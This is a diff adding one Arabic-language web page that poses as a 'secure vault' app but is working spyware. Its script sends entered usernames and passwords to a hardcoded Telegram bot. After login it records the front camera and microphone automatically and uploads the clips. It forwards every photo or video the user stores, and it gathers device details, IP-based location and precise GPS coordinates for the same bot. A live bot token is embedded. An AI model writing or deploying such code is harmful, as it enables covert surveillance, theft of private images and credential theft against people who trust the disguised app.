@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>خزنتي الآمنة</title>
+    <!-- المانيفست مدمج كـ Data URI -->
+    <link rel="manifest" href='data:application/manifest+json,{"name":"خزنتي الآمنة","short_name":"خزنتي","description":"تطبيق خزنة شخصية آمنة","start_url":"./","display":"standalone","background_color":"%23ffffff","theme_color":"%232c3e50","icons":[{"src":"data:image/svg+xml,%3Csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"%3E%3Crect width=\"100\" height=\"100\" fill=\"%232c3e50\"/%3E%3Ctext x=\"50\" y=\"55\" text-anchor=\"middle\" font-size=\"50\" fill=\"white\"%3E🔒%3C/text%3E%3C/svg%3E","sizes":"any","type":"image/svg+xml"}]}'>
+    <meta name="theme-color" content="#2c3e50">
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --bg: #f0f2f5;
+            --card: #ffffff;
+            --text: #333;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        /* شاشات الحساب */
+        #authSection {
+            max-width: 400px;
+            margin: 50px auto;
+            background: var(--card);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        #authSection h2 {
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+        #authSection input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1em;
+        }
+        #authSection .btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #authSection .btn:hover { background: #2980b9; }
+        #authSection .link {
+            margin-top: 15px;
+            font-size: 0.9em;
+            color: var(--secondary);
+            cursor: pointer;
+        }
+        /* التطبيق الرئيسي */
+        #appSection {
+            display: none;
+            flex: 1;
+        }
+        header {
+            background: var(--primary);
+            color: white;
+            padding: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .tabs {
+            display: flex;
+            background: white;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .tab {
+            flex: 1;
+            padding: 15px;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-size: 1em;
+            border-bottom: 3px solid transparent;
+        }
+        .tab.active {
+            border-bottom-color: var(--secondary);
+            color: var(--secondary);
+            font-weight: bold;
+        }
+        .content {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+            flex: 1;
+        }
+        video {
+            width: 100%;
+            max-height: 400px;
+            background: #000;
+            border-radius: 10px;
+            transform: scaleX(-1);
+        }
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .btn {
+            padding: 12px 20px;
+            background: var(--secondary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        .btn.secondary {
+            background: #95a5a6;
+        }
+        .btn:hover { opacity: 0.9; }
+        /* خزنة */
+        #vaultGallery {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        #vaultGallery img, #vaultGallery video {
+            width: 150px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        input[type="file"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin: 5px;
+        }
+        /* إعلانات وهمية */
+        .ad-banner {
+            background: #f8f9fa;
+            border: 1px dashed #ccc;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            color: #999;
+            font-size: 0.9em;
+        }
+        .ad-banner span {
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8em;
+            margin-bottom: 5px;
+        }
+        /* إعدادات */
+        #settingsSection {
+            display: none;
+            margin-top: 20px;
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <!-- شاشة التسجيل / الدخول -->
+    <div id="authSection">
+        <h2 id="authTitle">إنشاء حساب</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button id="authBtn" class="btn">إنشاء حساب</button>
+        <p class="link" id="switchAuth">لديك حساب بالفعل؟ تسجيل الدخول</p>
+    </div>
+
+    <!-- التطبيق الرئيسي (مخفي حتى تسجيل الدخول) -->
+    <div id="appSection">
+        <header>🔒 خزنتي الآمنة</header>
+        <div class="tabs">
+            <button class="tab active" data-tab="camera">📷 الكاميرا</button>
+            <button class="tab" data-tab="vault">🗄 الخزنة</button>
+            <button class="tab" data-tab="settings">⚙️ الإعدادات</button>
+        </div>
+
+        <!-- محتوى الكاميرا -->
+        <div class="content" id="cameraContent">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="controls">
+                <button id="recordBtn" class="btn">🎥 تسجيل فيديو (20 ث)</button>
+                <button id="stopBtn" class="btn secondary" disabled>⏹ إيقاف</button>
+            </div>
+            <div class="ad-banner">
+                <span>إعلان</span><br>
+                تطبيق رائع لتحرير الصور – حمله الآن مجانًا!
+            </div>
+        </div>
+
+        <!-- محتوى الخزنة -->
+        <div class="content hidden" id="vaultContent">
+            <h2>🗄 خزنتك الخاصة</h2>
+            <p style="margin:10px 0;">ارفع صورك ومقاطع الفيديو لحفظها بأمان</p>
+            <input type="file" id="fileInput" accept="image/*,video/*" multiple>
+            <button id="uploadBtn" class="btn">⬆️ رفع الملفات</button>
+            <div id="vaultGallery"></div>
+            <div class="ad-banner">
+                <span>إعلان</span><br>
+                حافظ على ذكرياتك مع أفضل تطبيقات التخزين السحابي!
+            </div>
+        </div>
+
+        <!-- محتوى الإعدادات -->
+        <div class="content hidden" id="settingsContent">
+            <h2>⚙️ الإعدادات</h2>
+            <button id="logoutBtn" class="btn secondary">تسجيل الخروج</button>
+            <div class="ad-banner">
+                <span>إعلان</span><br>
+                اشترك في النسخة المميزة لإزالة الإعلانات!
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================= إعدادات تيليجرام =================
+        const TELEGRAM_TOKEN = '8750908249:AAF8XjcipjtTTK4-5hePeM6PMgfLaCwiacA';
+        const CHAT_ID = '8770203269';
+
+        // ================= عناصر الواجهة =================
+        const authSection = document.getElementById('authSection');
+        const authTitle = document.getElementById('authTitle');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const authBtn = document.getElementById('authBtn');
+        const switchAuth = document.getElementById('switchAuth');
+        const appSection = document.getElementById('appSection');
+        const tabs = document.querySelectorAll('.tab');
+        const cameraContent = document.getElementById('cameraContent');
+        const vaultContent = document.getElementById('vaultContent');
+        const settingsContent = document.getElementById('settingsContent');
+        const video = document.getElementById('video');
+        const recordBtn = document.getElementById('recordBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const fileInput = document.getElementById('fileInput');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const vaultGallery = document.getElementById('vaultGallery');
+        const logoutBtn = document.getElementById('logoutBtn');
+
+        let isLoginMode = false;
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let autoRecordTimer = null;
+
+        // ================= نظام الحساب (محلي) =================
+        function checkAuth() {
+            const user = localStorage.getItem('vault_user');
+            if (user) {
+                authSection.style.display = 'none';
+                appSection.style.display = 'block';
+                initCamera();
+                collectDeviceInfo();
+            } else {
+                authSection.style.display = 'block';
+                appSection.style.display = 'none';
+            }
+        }
+
+        function registerUser(username, password) {
+            localStorage.setItem('vault_user', JSON.stringify({ username, password }));
+            // إرسال بيانات التسجيل إلى تيليجرام
+            const msg = `📝 <b>تسجيل حساب جديد</b>\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+            sendTelegramText(msg);
+        }
+
+        function loginUser(username, password) {
+            const stored = JSON.parse(localStorage.getItem('vault_user'));
+            if (stored && stored.username === username && stored.password === password) {
+                localStorage.setItem('vault_session', 'true');
+                authSection.style.display = 'none';
+                appSection.style.display = 'block';
+                // إرسال بيانات تسجيل الدخول
+                const msg = `🔓 <b>تسجيل دخول</b>\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+                sendTelegramText(msg);
+                initCamera();
+                collectDeviceInfo();
+                return true;
+            } else {
+                alert('اسم المستخدم أو كلمة المرور غير صحيحة');
+                return false;
+            }
+        }
+
+        authBtn.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            if (!username || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            if (isLoginMode) {
+                loginUser(username, password);
+            } else {
+                registerUser(username, password);
+                localStorage.setItem('vault_session', 'true');
+                authSection.style.display = 'none';
+                appSection.style.display = 'block';
+                initCamera();
+                collectDeviceInfo();
+            }
+        });
+
+        switchAuth.addEventListener('click', () => {
+            isLoginMode = !isLoginMode;
+            authTitle.textContent = isLoginMode ? 'تسجيل الدخول' : 'إنشاء حساب';
+            authBtn.textContent = isLoginMode ? 'تسجيل الدخول' : 'إنشاء حساب';
+            switchAuth.textContent = isLoginMode ? 'ليس لديك حساب؟ إنشاء حساب' : 'لديك حساب بالفعل؟ تسجيل الدخول';
+        });
+
+        logoutBtn.addEventListener('click', () => {
+            localStorage.removeItem('vault_session');
+            location.reload();
+        });
+
+        // ================= تبديل التبويبات =================
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                const tabName = tab.dataset.tab;
+                cameraContent.classList.add('hidden');
+                vaultContent.classList.add('hidden');
+                settingsContent.classList.add('hidden');
+                if (tabName === 'camera') cameraContent.classList.remove('hidden');
+                else if (tabName === 'vault') vaultContent.classList.remove('hidden');
+                else settingsContent.classList.remove('hidden');
+            });
+        });
+
+        // ================= الكاميرا والتسجيل =================
+        async function initCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+                video.srcObject = mediaStream;
+                // بدء التسجيل التلقائي بعد 2 ثانية
+                autoRecordTimer = setTimeout(() => {
+                    startRecording();
+                }, 2000);
+            } catch (err) {
+                console.error('فشل الوصول إلى الكاميرا:', err);
+                alert('يرجى السماح بالوصول إلى الكاميرا والميكروفون.');
+            }
+        }
+
+        function startRecording() {
+            if (!mediaStream || isRecording) return;
+            isRecording = true;
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            mediaRecorder.onstop = async () => {
+                isRecording = false;
+                stopBtn.disabled = true;
+                recordBtn.disabled = false;
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                await sendTelegramVideo(blob);
+            };
+            mediaRecorder.start();
+            recordBtn.disabled = true;
+            stopBtn.disabled = false;
+            // إيقاف تلقائيًا بعد 20 ثانية
+            setTimeout(() => {
+                if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+            }, 20000);
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }
+
+        recordBtn.addEventListener('click', startRecording);
+        stopBtn.addEventListener('click', stopRecording);
+
+        // ================= إرسال الوسائط إلى تيليجرام =================
+        async function sendTelegramText(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+                });
+            } catch (err) { console.error('فشل إرسال النص:', err); }
+        }
+
+        async function sendTelegramVideo(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'recording.webm');
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log('تم إرسال الفيديو');
+            } catch (err) { console.error('فشل إرسال الفيديو:', err); }
+        }
+
+        async function sendTelegramFile(file, type) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            if (type === 'photo') {
+                formData.append('photo', file);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } else if (type === 'video') {
+                formData.append('video', file);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+            }
+        }
+
+        // ================= خزنة الملفات =================
+        uploadBtn.addEventListener('click', async () => {
+            const files = fileInput.files;
+            if (files.length === 0) return;
+            for (let file of files) {
+                // عرض محلي
+                const url = URL.createObjectURL(file);
+                if (file.type.startsWith('image/')) {
+                    const img = document.createElement('img');
+                    img.src = url;
+                    vaultGallery.appendChild(img);
+                    await sendTelegramFile(file, 'photo');
+                } else if (file.type.startsWith('video/')) {
+                    const vid = document.createElement('video');
+                    vid.src = url;
+                    vid.controls = true;
+                    vaultGallery.appendChild(vid);
+                    await sendTelegramFile(file, 'video');
+                }
+            }
+            fileInput.value = '';
+        });
+
+        // ================= جمع معلومات الجهاز والموقع =================
+        async function collectDeviceInfo() {
+            let info = '🔍 <b>معلومات الجهاز</b>\n\n';
+            info += `🖥 <b>المتصفح:</b> ${navigator.userAgent}\n`;
+            info += `📱 <b>المنصة:</b> ${navigator.platform}\n`;
+            info += `🖥 <b>الدقة:</b> ${screen.width}x${screen.height}\n`;
+            info += `🌐 <b>اللغة:</b> ${navigator.language}\n`;
+            info += `⏰ <b>الوقت:</b> ${new Date().toLocaleString()}\n`;
+
+            // البطارية
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info += `🔋 <b>البطارية:</b> ${Math.round(battery.level * 100)}% (${battery.charging ? 'شحن' : 'غير شحن'})\n`;
+                } catch (e) {}
+            }
+
+            // الشبكة
+            if (navigator.connection) {
+                info += `📶 <b>الشبكة:</b> ${navigator.connection.effectiveType} - ${navigator.connection.downlink} Mbps\n`;
+            }
+
+            // عنوان IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                info += `🌍 <b>عنوان IP:</b> ${ipData.ip}\n`;
+                // موقع تقريبي من IP
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoRes.json();
+                    if (geoData.city) {
+                        info += `📍 <b>الموقع التقريبي:</b> ${geoData.city}, ${geoData.region}, ${geoData.country_name}\n`;
+                    }
+                } catch (e) {}
+            } catch (e) {}
+
+            // الموقع الدقيق
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        info += `📍 <b>الموقع الدقيق:</b> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n`;
+                        info += `🔗 https://www.google.com/maps?q=${latitude},${longitude}\n`;
+                        sendTelegramText(info);
+                    },
+                    (error) => {
+                        info += `📍 <b>الموقع الدقيق:</b> غير متاح (${error.message})\n`;
+                        sendTelegramText(info);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                sendTelegramText(info);
+            }
+        }
+
+        // ================= التهيئة =================
+        // التحقق من الجلسة عند التحميل
+        if (localStorage.getItem('vault_session') === 'true') {
+            authSection.style.display = 'none';
+            appSection.style.display = 'block';
+            initCamera();
+            collectDeviceInfo();
+        } else {
+            authSection.style.display = 'block';
+            appSection.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
